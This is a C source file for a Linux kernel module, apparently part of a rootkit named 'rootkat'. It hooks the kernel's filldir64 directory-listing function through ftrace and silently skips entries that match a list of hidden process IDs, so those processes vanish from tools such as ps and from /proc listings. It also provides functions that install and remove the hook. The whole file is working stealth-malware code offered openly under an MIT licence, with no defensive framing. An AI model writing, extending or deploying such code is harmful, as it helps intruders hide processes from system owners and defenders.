// SPDX-License-Identifier: MIT
#include <linux/dcache.h>
#include <linux/fs.h>
#include <linux/kernel.h>
#include "ftrace_hook.h"
#include "hook_filldir64.h"
#include "hidden_pids.h"

#define TAG "rootkat/hook_filldir64: "

static const char * const filldir64_candidates[] = {
	"filldir64", NULL,
};

typedef bool (*filldir64_t)(struct dir_context *ctx, const char *name,
                            int namlen, loff_t offset, u64 ino,
                            unsigned int d_type);

static bool rootkat_filldir64(struct dir_context *ctx, const char *name,
                              int namlen, loff_t offset, u64 ino,
                              unsigned int d_type);

static struct rootkat_hook hook_filldir64 = {
	.candidates  = filldir64_candidates,
	.replacement = rootkat_filldir64,
};

static bool rootkat_filldir64(struct dir_context *ctx, const char *name,
                              int namlen, loff_t offset, u64 ino,
                              unsigned int d_type)
{
	filldir64_t orig = (filldir64_t)hook_filldir64.original;

	if (rootkat_is_pid_name_hidden(name, namlen))
		return true;   /* skip silently — caller advances iterator */

	return orig(ctx, name, namlen, offset, ino, d_type);
}

int rootkat_hook_filldir64_install(void)
{
	return rootkat_hook_install(&hook_filldir64);
}

void rootkat_hook_filldir64_remove(void)
{
	rootkat_hook_remove(&hook_filldir64);
}
